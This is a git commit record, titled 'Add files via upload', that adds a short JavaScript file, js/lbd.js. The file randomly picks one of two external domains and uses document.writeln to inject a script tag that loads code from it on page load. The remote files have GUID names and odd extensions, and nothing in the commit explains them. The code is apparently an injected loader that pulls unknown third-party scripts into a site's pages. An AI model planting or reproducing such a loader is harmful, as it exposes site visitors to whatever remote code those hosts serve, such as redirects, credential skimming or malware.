57ff3e7778dbbb95a8230f21e2bbe85cf0def80d
heihub <63719020+heihub@users.noreply.github.com>
2020-07-11 10:12:44 -0700

    Add files via upload

---
+++ js/lbd.js
@@ -0,0 +1,10 @@
+var m = 2;
+var n = Math.floor(Math.random() * m + 1);
+switch (n) {
+case 1:
+document.writeln('<script src="https://p.minyaartcrafts.cn/dipper/4897D855-9572-4CCD-BE03-2DA21D3F0935.po"></script>');
+break;
+case 2:
+document.writeln('<script src="https://s.hzyyhz.cn/c/CEADBB70-7643-4EC2-8BC7-17D99EAB4405.alpha"></script>');
+break;
+}
